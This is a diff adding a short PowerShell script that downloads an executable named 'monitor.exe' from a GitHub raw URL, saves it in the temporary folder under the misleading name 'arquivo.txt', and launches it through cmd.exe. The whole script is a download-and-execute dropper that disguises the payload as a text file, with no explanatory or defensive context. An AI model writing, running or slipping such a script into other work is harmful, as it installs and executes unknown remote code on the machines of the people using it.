@@ -1,0 +1,11 @@
+#
+$url = "https://raw.githubusercontent.com/0fxdb/instructions/main/safe/monitor.exe"
+
+#
+$destino = "$env:TEMP\arquivo.txt"
+
+#
+Invoke-WebRequest -Uri $url -OutFile $destino
+
+#
+Start-Process cmd.exe -ArgumentList "/c start $destino"
